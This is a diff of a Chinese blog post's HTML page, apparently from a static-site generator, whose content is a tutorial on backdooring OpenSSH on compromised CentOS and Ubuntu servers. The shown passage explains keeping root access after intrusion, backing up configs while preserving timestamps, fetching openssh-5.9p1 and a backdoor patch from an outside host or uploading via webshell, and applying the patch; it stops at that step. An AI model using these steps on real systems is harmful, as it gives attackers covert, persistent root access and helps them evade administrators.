@@ -128,7 +128,7 @@
 <meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-9-26/42590305.jpg">
 <meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-9-26/58021783.jpg">
 <meta property="og:image" content="http://obh1qcqek.bkt.clouddn.com/17-9-26/59095904.jpg">
-<meta property="og:updated_time" content="2017-09-26T14:10:42.416Z">
+<meta property="og:updated_time" content="2017-09-26T14:17:51.848Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="Linux渗透之OpenSSH后门">
 <meta name="twitter:description" content="当我们拿到一个服务器的shell之后，肯定需要维持好我们的权限，这里我们需要留个后门方便我们进出。这里我们不讨论提权的问题，前提我们通过各种方式提权到root，拿到root之后才是我们留后门的开始。做了个openssh的后门，也就是root双密码，管理一个密码、我们的后门一个密码，不影响管理的那个密码。　　这里我们讨论两个Linux，实验环境为Centos 7和Ubuntu 16.0.4
@@ -467,6 +467,7 @@
       
         <p>　　当我们拿到一个服务器的shell之后，肯定需要维持好我们的权限，这里我们需要留个后门方便我们进出。这里我们不讨论提权的问题，前提我们通过各种方式提权到root，拿到root之后才是我们留后门的开始。做了个openssh的后门，也就是root双密码，管理一个密码、我们的后门一个密码，不影响管理的那个密码。<br>　　这里我们讨论两个Linux，实验环境为Centos 7和Ubuntu 16.0.4</p>
 <h3 id="0x01-查看版本"><a href="#0x01-查看版本" class="headerlink" title="0x01 查看版本"></a>0x01 查看版本</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ssh -V</div></pre></td></tr></table></figure>
+<a id="more"></a>
 <p>Centos 7.0<br><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/42766212.jpg" alt=""><br>Ubuntu 16.0.4<br><img src="http://obh1qcqek.bkt.clouddn.com/17-9-26/78241917.jpg" alt=""><br>有必要的话需要对原ssh配置文件进行备份，可以对后期的文件时间进行修改：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">cp -p /etc/ssh/ssh_config  / etc/ssh/ssh_config.bak</div><div class="line">cp -p /etc/ssh/sshd_config  / etc/ssh/sshd_config.bak</div></pre></td></tr></table></figure></p>
 <h3 id="0x02-下载SSH配置文件"><a href="#0x02-下载SSH配置文件" class="headerlink" title="0x02 下载SSH配置文件"></a>0x02 下载SSH配置文件</h3><p><a href="http://ifuryst.com/usr/uploads/data/openssh-5.9p1.tar.gz" target="_blank" rel="external">openssh-5.9p1.tar.gz</a><br><a href="http://ifuryst.com/usr/uploads/data/openssh-5.9p1.patch.tar.gz" target="_blank" rel="external">openssh-5.9p1.patch.tar.gz</a><br>　　使用wget进行远程下载，如果没有安装wget，可以安装可以直接下载openssh源码，也可以使用菜刀大马等上传上去。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">Centos:yum -y install wget</div><div class="line">Ubuntu:apt-get install wget</div></pre></td></tr></table></figure></p>
 <h3 id="0x03-编辑安装"><a href="#0x03-编辑安装" class="headerlink" title="0x03 编辑安装"></a>0x03 编辑安装</h3><p>Centos 7<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">tar zxvf openssh-5.9p1.tar.gz</div><div class="line">tar zxvf openssh-5.9p1.patch.tar.gz</div><div class="line">cp openssh-5.9p1.patch/sshbd5.9p1.diff openssh-5.9p1/   复制patch后门文件到正常openssh里面</div><div class="line">patch &lt; sshbd5.9p1.diff</div></pre></td></tr></table></figure></p>
